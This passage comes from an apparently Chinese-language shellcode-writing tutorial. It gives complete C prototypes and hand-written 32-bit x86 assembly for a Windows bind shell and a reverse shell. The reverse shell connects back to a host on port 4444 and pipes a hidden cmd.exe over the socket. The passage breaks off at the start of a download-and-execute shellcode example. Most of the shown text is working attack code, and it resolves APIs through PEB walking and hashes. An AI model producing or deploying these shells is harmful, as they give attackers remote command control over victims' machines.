class="comment">// bind</span></span><br><span class="line">  nret = bind(MySock, (<span class="keyword">struct</span> sockaddr*)&amp;host, <span class="keyword">sizeof</span>(host));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size of sockadr is %d\n"</span>, <span class="keyword">sizeof</span>(host));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nret == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Error on bind\n"</span>);</span><br><span class="line">      WSACleanup();</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// listen</span></span><br><span class="line">  nret = listen(MySock, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nret == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Error on bind\n"</span>);</span><br><span class="line">      WSACleanup();</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// accept</span></span><br><span class="line">  addr = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">  <span class="keyword">int</span> addrlen = <span class="number">16</span>;</span><br><span class="line">  NSock = accept(MySock, addr, &amp;addrlen);</span><br><span class="line">  <span class="keyword">if</span> (NSock == SOCKET_ERROR)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error on accept\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// CreateProcess</span></span><br><span class="line">  <span class="keyword">char</span> cmd[] = <span class="string">"cmd"</span>;</span><br><span class="line">  STARTUPINFO startupinfo;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size of STARTUPINFO is %d\n"</span>, <span class="keyword">sizeof</span>(startupinfo));</span><br><span class="line">  PROCESS_INFORMATION processinformation;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size of PROCESS_INFORMATION is %d\n"</span>, <span class="keyword">sizeof</span>(processinformation));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;startupinfo, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(STARTUPINFO));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;processinformation, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(PROCESS_INFORMATION));</span><br><span class="line">  startupinfo.cb = <span class="number">0x44</span>;</span><br><span class="line">  startupinfo.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;</span><br><span class="line">  startupinfo.wShowWindow = SW_HIDE;</span><br><span class="line">  startupinfo.hStdInput = (HANDLE)NSock;</span><br><span class="line">  startupinfo.hStdOutput =(HANDLE)NSock;</span><br><span class="line">  startupinfo.hStdError = (HANDLE)NSock;</span><br><span class="line">  FreeConsole();</span><br><span class="line">  CreateProcess(<span class="literal">NULL</span>, cmd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;startupinfo, &amp;processinformation);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ExitProcess</span></span><br><span class="line">  ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>asm.c :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; port_bind.asm&#10;BITS 32&#10;[SECTION .text]&#10;global _start&#10;_start:&#10;    jmp start_asm&#10;&#10;;DEFINE FUNCTIONS&#10;&#10;    find_kernel32:&#10;        push esi&#10;&#9;xor eax, eax&#10;&#9;mov eax, [fs:eax+0x30] &#9;;PEB&#10;&#9;mov eax, [eax + 0x0c]&#9;;PEB-&#62;LoaderData&#10;&#9;mov esi, [eax + 0x1c]&#9;;PEB-&#62;LoaderData-&#62;InInitializationOrderModuleList&#10;&#9;lodsd&#9;&#9;&#9;;next entry the double linked list point to&#10;&#9;mov eax, [eax + 0x8]&#9;;imagebase of kernel32&#10;&#9;pop esi&#10;&#9;ret&#10;&#10;&#9;;END FUNCTION: find_kernel32&#10;&#10;&#9;; FUNCTION: find_function&#10;    find_function:&#9;&#9;; find_functions(edx, eax)&#10;        pushad&#10;&#9;mov ebp, [esp+0x24]&#9;;edx(dll)&#10;&#9;mov eax, [ebp+0x3c]&#9;;Skip MS DOS header to PE header&#10;&#9;mov edx, [ebp+eax+0x78]&#9;;Export table is 0x78 byts from the start of the PE header&#10;&#9;add edx, ebp&#9;&#9;;Absolute address&#10;&#9;mov ecx, [edx+0x18]&#9;;Number of functions&#10;&#9;mov ebx, [edx+0x20]&#9;; address of names(rva) table relative offset&#10;&#9;add ebx, ebp&#9;&#9;; make the name talbe address absolute&#10;    find_function_loop:&#10;&#9;jecxz find_function_finished&#10;&#9;dec ecx&#10;&#9;mov esi, [ebx+ecx*4]&#10;&#9;add esi, ebp&#10;    compute_hash:&#10;        xor edi, edi&#10;&#9;xor eax, eax&#10;&#9;cld&#10;    compute_hash_again:&#10;        lodsb&#10;&#9;test al, al&#10;&#9;jz compute_hash_finished&#10;&#9;ror edi, 0xd&#10;&#9;add edi, eax&#10;&#9;jmp compute_hash_again&#10;    compute_hash_finished:&#10;    find_funtion_compare:&#10;        cmp edi, [esp+0x28]&#10;&#9;jnz find_function_loop&#10;&#9;mov ebx, [edx+0x24]&#9;; Exetract ordinals table relative offset and store it in ebx&#10;&#9;add ebx, ebp&#10;&#9;mov cx, [ebx + 2*ecx]&#9;; Extract the current symbos ordinal number from the ordinal table; Ordinals are 2 bytes in size&#10;&#9;mov ebx, [edx+0x1c]&#9;;Extract the address table relative offset and store it in ebx&#10;&#9;add ebx, ebp&#9;&#9;; make the address table address absolute&#10;&#9;mov eax, [ebx + 4*ecx]&#9;; extract the realtve function offset from its ordinal and store it in eax&#10;&#9;add eax, ebp&#10;&#9;mov [esp+0x1c], eax&#9;; overwrite eax&#10;    find_function_finished:&#10;&#9;popad&#10;&#9;ret&#10;&#10;&#9;; END FUNCTION: find_function&#10;&#9;; FUNCTION: resolve_symbols_for_dll&#10;    resolve_symbols_for_dll:&#10;&#9;; about to load current hash into eax(pointed by esi)&#10;&#9;lodsd&#10;&#9;push eax&#10;&#9;push edx&#10;&#9;call find_function&#10;&#9;mov [edi], eax&#10;&#9;add esp, 0x08&#10;&#9;add edi, 0x04&#10;&#9;cmp esi, ecx&#10;&#9;jne resolve_symbols_for_dll&#10;    resolve_symbols_for_dll_finished:&#10;        ret&#10;&#10;&#9;; END FUNCTION: resolve_symbols_for_dll&#10;&#10;;END FUNCTIONS&#10;&#10;    locate_kernel32_hashes:&#10;        call locate_kernel32_hashes_return&#10;&#9;; BIG ENDIAN&#10;&#9;; LoadLibraryA&#10;&#9;db 0x8e, 0x4e, 0x0e, 0xec&#10;&#9;; CreateProcessA&#10;&#9;db 0x72, 0xfe, 0xb3, 0x16&#10;&#9;; ExitProcess&#10;&#9;db 0x7e, 0xd8, 0xe2, 0x73&#10;    ;locate ws2_32_hashes&#10;        ; WSASocketA&#10;&#9;db 0xd9, 0x09, 0xf5, 0xad&#10;&#9;; bind&#10;&#9;db 0xa4, 0x1a, 0x70, 0xc7&#10;&#9;; listen&#10;&#9;db 0xa4, 0xad, 0x2e, 0xe9&#10;&#9;; accept&#10;&#9;db 0xe5, 0x49, 0x86, 0x49&#10;&#9;; WSAStartup&#10;&#9;db 0xcb, 0xed, 0xfc, 0x3b&#10;    ; END DEFINE CONSTANTS&#10;&#10;    start_asm:&#10;       sub esp, 0x68 ; !!&#38543;&#20415;&#32473;&#30340;&#10;       mov ebp, esp&#10;       call find_kernel32&#10;       mov edx, eax&#10;       ; resolve kernel32 symbols&#10;       jmp short locate_kernel32_hashes&#10;    locate_kernel32_hashes_return:&#10;       pop esi&#10;       lea edi,[ebp+0x00] &#10;       mov ecx, esi&#10;&#10;&#9;&#10;        &#10;&#10;       add ecx, 0x0c ; length of kernel32 list&#10;       call resolve_symbols_for_dll&#10;&#10;       ; resolve ws2_32 symbols&#10;       add ecx, 0x14&#10;       xor eax, eax&#10;       mov ax, 0x3233&#10;       push eax&#10;       push dword 0x5f327377&#10;       mov ebx, esp ; point to &#34;ws2_32&#34;&#10;&#10;       push ecx&#10;       push edx&#10;       push ebx&#10;       call [ebp+0x0]&#10;&#10;       pop edx ; kernel32 address&#10;       pop ecx ; counter&#10;       mov edx, eax ; ws2_32.dll address&#10;       call resolve_symbols_for_dll&#10;&#10;   initialize_cmd:&#10;       mov eax, 0x646d6301&#10;       sar eax, 0x08&#10;       push eax&#10;       mov [ebp+0x30], esp&#10;&#10;   WSAStartup:&#10;       xor edx, edx&#10;       mov edx, 0x190&#10;       sub esp, edx&#10;       ; initialize winsock&#10;       push esp&#10;       push 0x02&#10;       call [ebp+0x1c]&#10;       add esp, 0x190&#10;&#10;   create_socket:&#10;       xor eax, eax&#10;       push eax&#10;       push eax&#10;       push eax&#10;       push eax&#10;       inc eax&#10;       push eax&#10;       inc eax&#10;       push eax&#10;       call [ebp+0x0c]&#10;       mov esi, eax&#10;&#10;   bind:&#10;       xor eax, eax&#10;       xor ebx, ebx&#10;       push eax&#10;       push eax&#10;       push eax&#10;       mov eax, 0x5c110102&#10;       dec ah&#10;       push eax&#10;       mov eax, esp&#10;       mov bl, 0x10&#10;       push ebx&#10;       push eax&#10;       push esi&#10;       call [ebp+0x10]&#10;&#10;   listen:&#10;       push ebx&#10;       push esi&#10;       call [ebp+0x14]&#10;&#10;   accept:&#10;       push ebx&#10;       mov edx, esp&#10;       sub esp, ebx&#10;       mov ecx, esp&#10;       push edx&#10;       push ecx&#10;       push esi&#10;       call [ebp+0x18]&#10;       mov esi, eax&#10;&#10;   initialize_process:&#10;       xor ecx, ecx&#10;       mov cl, 0x54&#10;       sub esp,ecx&#10;       mov edi, esp&#10;       push edi&#10;   zero_structs:&#10;       xor eax, eax&#10;       rep stosb&#10;       pop edi&#10;   initialize_structs:&#10;       mov byte [edi], 0x44&#10;       inc byte [edi+0x2d] ; STARTF_USESTDHANDLES &#10;       push edi&#10;       mov eax, esi&#10;       lea edi, [edi+0x38]&#10;       stosd&#10;       stosd&#10;       stosd&#10;       pop edi&#10;   execute_process:&#10;       xor eax, eax&#10;       lea esi, [edi+0x44]&#10;       push esi&#10;       push edi&#10;       push eax&#10;       push eax&#10;       push eax&#10;       inc eax&#10;       push eax&#10;       dec eax&#10;       push eax&#10;       push eax&#10;       push dword [ebp+0x30] ; p-&#62;&#34;cmd&#34;&#10;       push eax&#10;       call [ebp+0x04]&#10;   exit_process:&#10;       call [ebp+0x08]</span><br></pre></td></tr></table></figure>
<h3 id="示例2：反弹shellcode">示例2：反弹shellcode</h3><p>反向连接shellcode，提供远程控制台。反向到192.168.56.102, 端口4444</p>
<p>C 示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * =====================================================================================</span><br><span class="line"> *</span><br><span class="line"> *       Filename:  connectback.c</span><br><span class="line"> *</span><br><span class="line"> *    Description:  Connect back example</span><br><span class="line"> *</span><br><span class="line"> *        Version:  1.0</span><br><span class="line"> *        Created:  08/23/2013 04:49:55 PM</span><br><span class="line"> *       Revision:  none</span><br><span class="line"> *       Compiler:  gcc</span><br><span class="line"> *</span><br><span class="line"> *         Author:  Reverland, </span><br><span class="line"> *   Organization:  </span><br><span class="line"> *</span><br><span class="line"> * =====================================================================================</span><br><span class="line"> */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;wininet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  WSADATA wsaData;</span><br><span class="line">  WORD wVersionRequested;</span><br><span class="line">  <span class="keyword">struct</span> sockaddr_in host, client;</span><br><span class="line">  <span class="keyword">struct</span> sockaddr* addr;</span><br><span class="line">  SOCKET MySock, NSock;</span><br><span class="line">  wVersionRequested = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">int</span> nret;</span><br><span class="line">  <span class="keyword">char</span> ip[] = <span class="string">"127.0.0.1"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// FreeConsole</span></span><br><span class="line">  FreeConsole();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size of WSADATA is %d\n"</span>, <span class="keyword">sizeof</span>(wsaData));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size of wVersionRequested is %d\n"</span>, <span class="keyword">sizeof</span>(wVersionRequested));</span><br><span class="line">  <span class="comment">// WSAStartup</span></span><br><span class="line">  <span class="keyword">if</span> (WSAStartup(wVersionRequested, &amp;wsaData) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ws2 outof date!\n"</span>);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// WSASocket</span></span><br><span class="line">  MySock = WSASocket(AF_INET, SOCK_STREAM, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  client.sin_family = AF_INET;</span><br><span class="line">  client.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line">  client.sin_port = htons(<span class="number">4444</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// bind</span></span><br><span class="line">  nret = connect(MySock, (<span class="keyword">struct</span> sockaddr*)&amp;client, <span class="keyword">sizeof</span>(client));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size of sockadr is %d\n"</span>, <span class="keyword">sizeof</span>(host));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nret == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Error on connect\n"</span>);</span><br><span class="line">      WSACleanup();</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// CreateProcess</span></span><br><span class="line">  <span class="keyword">char</span> cmd[] = <span class="string">"cmd"</span>;</span><br><span class="line">  STARTUPINFO startupinfo;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size of STARTUPINFO is %d\n"</span>, <span class="keyword">sizeof</span>(startupinfo));</span><br><span class="line">  PROCESS_INFORMATION processinformation;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size of PROCESS_INFORMATION is %d\n"</span>, <span class="keyword">sizeof</span>(processinformation));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;startupinfo, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(STARTUPINFO));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;processinformation, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(PROCESS_INFORMATION));</span><br><span class="line">  startupinfo.cb = <span class="number">0x44</span>;</span><br><span class="line">  startupinfo.dwFlags = STARTF_USESTDHANDLES;</span><br><span class="line">  startupinfo.hStdInput = (HANDLE)MySock;</span><br><span class="line">  startupinfo.hStdOutput =(HANDLE)MySock;</span><br><span class="line">  startupinfo.hStdError = (HANDLE)MySock;</span><br><span class="line">  FreeConsole();</span><br><span class="line">  CreateProcess(<span class="literal">NULL</span>, cmd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;startupinfo, &amp;processinformation);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ExitProcess</span></span><br><span class="line">  ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>asm：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SECTION .text]&#10;BITS 32&#10;global _start&#10;_start:&#10;    jmp start_asm&#10;&#10;;DEFINE FUNCTIONS&#10;&#10;    find_kernel32:&#10;        push esi&#10;&#9;xor eax, eax&#10;&#9;mov eax, [fs:eax+0x30] &#9;;PEB&#10;&#9;mov eax, [eax + 0x0c]&#9;;PEB-&#62;LoaderData&#10;&#9;mov esi, [eax + 0x1c]&#9;;PEB-&#62;LoaderData-&#62;InInitializationOrderModuleList&#10;&#9;lodsd&#9;&#9;&#9;;next entry the double linked list point to&#10;&#9;mov eax, [eax + 0x8]&#9;;imagebase of kernel32&#10;&#9;pop esi&#10;&#9;ret&#10;&#10;&#9;;END FUNCTION: find_kernel32&#10;&#10;&#9;; FUNCTION: find_function&#10;    find_function:&#9;&#9;; find_functions(edx, eax)&#10;        pushad&#10;&#9;mov ebp, [esp+0x24]&#9;;edx(dll)&#10;&#9;mov eax, [ebp+0x3c]&#9;;Skip MS DOS header to PE header&#10;&#9;mov edx, [ebp+eax+0x78]&#9;;Export table is 0x78 byts from the start of the PE header&#10;&#9;add edx, ebp&#9;&#9;;Absolute address&#10;&#9;mov ecx, [edx+0x18]&#9;;Number of functions&#10;&#9;mov ebx, [edx+0x20]&#9;; address of names(rva) table relative offset&#10;&#9;add ebx, ebp&#9;&#9;; make the name talbe address absolute&#10;    find_function_loop:&#10;&#9;jecxz find_function_finished&#10;&#9;dec ecx&#10;&#9;mov esi, [ebx+ecx*4]&#10;&#9;add esi, ebp&#10;    compute_hash:&#10;        xor edi, edi&#10;&#9;xor eax, eax&#10;&#9;cld&#10;    compute_hash_again:&#10;        lodsb&#10;&#9;test al, al&#10;&#9;jz compute_hash_finished&#10;&#9;ror edi, 0xd&#10;&#9;add edi, eax&#10;&#9;jmp compute_hash_again&#10;    compute_hash_finished:&#10;    find_funtion_compare:&#10;        cmp edi, [esp+0x28]&#10;&#9;jnz find_function_loop&#10;&#9;mov ebx, [edx+0x24]&#9;; Exetract ordinals table relative offset and store it in ebx&#10;&#9;add ebx, ebp&#10;&#9;mov cx, [ebx + 2*ecx]&#9;; Extract the current symbos ordinal number from the ordinal table; Ordinals are 2 bytes in size&#10;&#9;mov ebx, [edx+0x1c]&#9;;Extract the address table relative offset and store it in ebx&#10;&#9;add ebx, ebp&#9;&#9;; make the address table address absolute&#10;&#9;mov eax, [ebx + 4*ecx]&#9;; extract the realtve function offset from its ordinal and store it in eax&#10;&#9;add eax, ebp&#10;&#9;mov [esp+0x1c], eax&#9;; overwrite eax&#10;    find_function_finished:&#10;&#9;popad&#10;&#9;ret&#10;&#10;&#9;; END FUNCTION: find_function&#10;&#9;; FUNCTION: resolve_symbols_for_dll&#10;    resolve_symbols_for_dll:&#10;&#9;; about to load current hash into eax(pointed by esi)&#10;&#9;lodsd&#10;&#9;push eax&#10;&#9;push edx&#10;&#9;call find_function&#10;&#9;mov [edi], eax&#10;&#9;add esp, 0x08&#10;&#9;add edi, 0x04&#10;&#9;cmp esi, ecx&#10;&#9;jne resolve_symbols_for_dll&#10;    resolve_symbols_for_dll_finished:&#10;        ret&#10;&#10;&#9;; END FUNCTION: resolve_symbols_for_dll&#10;&#10;;END FUNCTIONS&#10;&#10;    locate_kernel32_hashes:&#10;        call locate_kernel32_hashes_return&#10;        ;LoadLibraryA&#10;        db 0x8e&#10;        db 0x4e&#10;        db 0x0e&#10;        db 0xec&#10;        ;CreateProcessA&#10;        db 0x72&#10;        db 0xfe&#10;        db 0xb3&#10;        db 0x16&#10;        ;ExitProcess&#10;        db 0x7e&#10;        db 0xd8&#10;        db 0xe2&#10;        db 0x73&#10;        ;locate_ws2_32_hashes:&#10;        ;WSASocketA&#10;        db 0xd9&#10;        db 0x09&#10;        db 0xf5&#10;        db 0xad&#10;        ;connect&#10;        db 0xec&#10;        db 0xf9&#10;        db 0xaa&#10;        db 0x60&#10;        ;WSAStartup&#10;        db 0xcb&#10;        db 0xed&#10;        db 0xfc&#10;        db 0x3b&#10;        ;END DEFINE CONSTANTS&#10;&#10;    start_asm:&#10;        sub esp, 0x68&#10;&#9;mov ebp, esp&#10;&#9;call find_kernel32&#10;&#9;mov edx, eax&#10;        ; resolve kernel32 symbols&#10;        jmp short locate_kernel32_hashes&#10;    locate_kernel32_hashes_return:&#10;        pop esi&#10;        lea edi,[ebp+0x00] &#10;        mov ecx, esi&#10;        add ecx, 0x0c ; length of kernel32 list&#10;        call resolve_symbols_for_dll&#10;&#10;        ; resolve ws2_32 symbols&#10;        add ecx, 0x0c&#10;&#9;; create ws2_32 string&#10;        xor eax, eax&#10;        mov ax, 0x3233&#10;        push eax&#10;        push dword 0x5f327377&#10;        mov ebx, esp ; point to &#34;ws2_32&#34;&#10;&#10;&#9;push ecx&#10;        push edx&#10;        push ebx&#10;        call [ebp+0x0] ; LoadLibraryA(&#34;ws2_32&#34;)&#10;&#10;        pop edx ; kernel32 address&#10;        pop ecx ; counter&#10;        mov edx, eax ; ws2_32.dll address&#10;        call resolve_symbols_for_dll&#10;&#10;        initialize_cmd:&#10;            mov eax, 0x646d6301&#10;            sar eax, 0x08&#10;            push eax&#10;            mov [ebp+0x24], esp&#10;&#9;&#10;        WSAStartup:&#10;            xor edx, edx&#10;            mov edx, 0x190&#10;            sub esp, edx&#10;            ; initialize winsock&#10;            push esp&#10;            push 0x02&#10;            call [ebp+0x14]&#10;            add esp, 0x190&#10;&#10;   create_socket:&#10;       xor eax, eax&#10;       push eax&#10;       push eax&#10;       push eax&#10;       push eax&#10;       inc eax&#10;       push eax&#10;       inc eax&#10;       push eax&#10;       call [ebp+0x0c]&#10;       mov esi, eax&#10;&#10;    do_connect:&#10;        push 0x0100007f&#10;&#9;mov eax, 0x5c110102&#10;&#9;dec ah&#10;&#9;push eax&#10;&#9;mov ebx, esp&#10;&#9;xor eax, eax&#10;&#9;mov al, 0x10&#10;&#9;push eax&#10;&#9;push ebx&#10;&#9;push esi&#10;&#9;call [ebp+0x10]&#10;&#10;   initialize_process:&#10;       xor ecx, ecx&#10;       mov cl, 0x54&#10;       sub esp,ecx&#10;       mov edi, esp&#10;       push edi&#10;   zero_structs:&#10;       xor eax, eax&#10;       rep stosb&#10;       pop edi&#10;   initialize_structs:&#10;       mov byte [edi], 0x44&#10;       inc byte [edi+0x2d] ; STARTF_USESTDHANDLES &#10;       push edi&#10;       mov eax, esi&#10;       lea edi, [edi+0x38]&#10;       stosd&#10;       stosd&#10;       stosd&#10;       pop edi&#10;   execute_process:&#10;       xor eax, eax&#10;       lea esi, [edi+0x44]&#10;       push esi&#10;       push edi&#10;       push eax&#10;       push eax&#10;       push eax&#10;       inc eax&#10;       push eax&#10;       dec eax&#10;       push eax&#10;       push eax&#10;       push dword [ebp+0x24] ; p-&#62;&#34;cmd&#34;&#10;       push eax&#10;       call [ebp+0x04]&#10;   exit_process:&#10;       call [ebp+0x08]</span><br></pre></td></tr></table></figure>
<h3 id="下载并运行shellcode">下载并运行shellcode</h3><p>C原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * =====================================================================================</span><br><span class="line"> *</span><br><span class="line"> *       Filename:  download_execute.c</span><br><span class="line"> *</span><br><span class="line"> *    Description:  Download and execute shellcode</span><br><span class="line"> *</span><br><span class="line"> *        Version:  1.0</span><br><span class="line"> *        Created:  08/22/2013 03:53:36 PM</span><br><span class="line"> *       Revision:  none</span><br><span class="line"> *       Compiler:  gcc</span><br><span class="line"> *</span><br><span class="line"> *         Author:  Reverland, </span><br><span class="line"> *   Organization:  </span><br><span class="line"> *</span><br><span class="line"> * =====================================================================================</span><br><span class="line"> */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;wininet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  HINTERNET nethandle;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allocate an internet handle</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Allocate an internet handle\n"</span>);</span><br><span class="line">  nethandle = InternetOpen(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (nethandle == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error on InternetOpen\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allocate a resource handle</span></span><br><span class="line">  <span 